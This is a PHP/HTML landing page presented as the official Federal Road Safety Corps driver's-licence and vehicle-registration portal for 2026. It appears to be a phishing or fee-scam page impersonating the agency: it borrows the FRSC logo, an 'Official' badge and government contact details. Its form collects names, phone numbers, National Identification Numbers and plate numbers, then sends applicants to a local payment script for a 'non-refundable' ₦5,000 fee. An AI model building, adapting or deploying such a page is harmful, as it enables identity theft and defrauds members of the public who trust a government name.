<?php include 'config.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>FRSC – Federal Road Safety Corps | Online Application Portal</title>
  <link rel="stylesheet" href="style.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body>
  <header>
    <div class="header-top">
      <div class="container">
        <span>🇳🇬 Federal Republic of Nigeria</span>
        <span>FRSC – Road Safety First</span>
      </div>
    </div>
    <div class="header-main container">
      <img src="https://frsc.gov.ng/wp-content/uploads/2020/06/FRSC-Logo.png" alt="FRSC Logo" class="logo" onerror="this.src='https://via.placeholder.com/80x80?text=FRSC'">
      <div class="header-text">
        <h1>Federal Road Safety Corps</h1>
        <p>National Drivers' Registration &amp; Licensing Portal</p>
      </div>
      <div class="header-badge">Official</div>
    </div>
  </header>

  <nav>
    <div class="container">
      <a href="#" class="active">Home</a>
      <a href="#">Apply Now</a>
      <a href="#">Check Status</a>
      <a href="#">Support</a>
      <a href="#">Contact</a>
    </div>
  </nav>

  <main class="container">
    <section class="hero">
      <h2>2026 Online Application for Driver's License &amp; Vehicle Registration</h2>
      <p>Complete your application securely through the official FRSC digital platform. All data is encrypted and protected.</p>
      <div class="notice">
        <strong>⚠️ Important:</strong> This payment covers the mandatory administrative processing fee for your application.
      </div>
    </section>

    <section class="form-section">
      <div class="form-card">
        <h3>Applicant Details</h3>
        <p class="sub-text">Fill in all fields exactly as they appear on your National ID.</p>
        <form action="pay.php" method="POST">
          <div class="form-group">
            <label>Full Name (as on NIN)</label>
            <input name="fullname" placeholder="e.g. Adebayo O. Johnson" required>
          </div>
          <div class="form-group">
            <label>Email Address</label>
            <input name="email" type="email" placeholder="you@example.com" required>
          </div>
          <div class="form-group">
            <label>Phone Number</label>
            <input name="phone" placeholder="080 1234 5678" required>
          </div>
          <div class="form-group">
            <label>National Identification Number (NIN)</label>
            <input name="nin" placeholder="11-digit NIN" pattern="[0-9]{11}" title="Enter 11 digits" required>
          </div>
          <div class="form-group">
            <label>Vehicle Plate Number</label>
            <input name="plate" placeholder="e.g. ABC-123DE" pattern="[A-Z]{3}-[0-9]{3}[A-Z]{2}" title="Format: ABC-123DE" required>
          </div>

          <div class="payment-instruction">
            <h4>💰 Payment Instruction</h4>
            <p>You are about to pay the <strong>non-refundable administrative processing fee</strong> of <strong>₦5,000</strong> (NGN).</p>
            <ul>
              <li>✔ This fee covers document verification, data entry, and processing.</li>
              <li>✔ Payment is secured via Paystack – SSL encrypted.</li>
              <li>✔ After payment, you will receive a confirmation reference.</li>
              <li>✔ No additional charges – one-time payment only.</li>
            </ul>
          </div>

          <button type="submit" class="btn-primary">Proceed to Payment – ₦5,000</button>
        </form>
      </div>

      <aside class="info-sidebar">
        <div class="info-box">
          <h4>Need Help?</h4>
          <p>Call FRSC Support: <strong>0700-225-3772</strong></p>
          <p>Email: <strong>support@frsc.gov.ng</strong></p>
        </div>
        <div class="info-box">
          <h4>Processing Time</h4>
          <p>Applications are reviewed within <strong>2–5 business days</strong> after payment confirmation.</p>
        </div>
        <div class="info-box">
          <h4>Security</h4>
          <p>This portal uses 256-bit SSL encryption. Your data is safe.</p>
        </div>
      </aside>
    </section>
  </main>

  <footer>
    <div class="container">
      <p>&copy; 2026 Federal Road Safety Corps. All rights reserved.</p>
      <p>Built with ❤️ for Nigerian road safety.</p>
    </div>
  </footer>
</body>
</html>
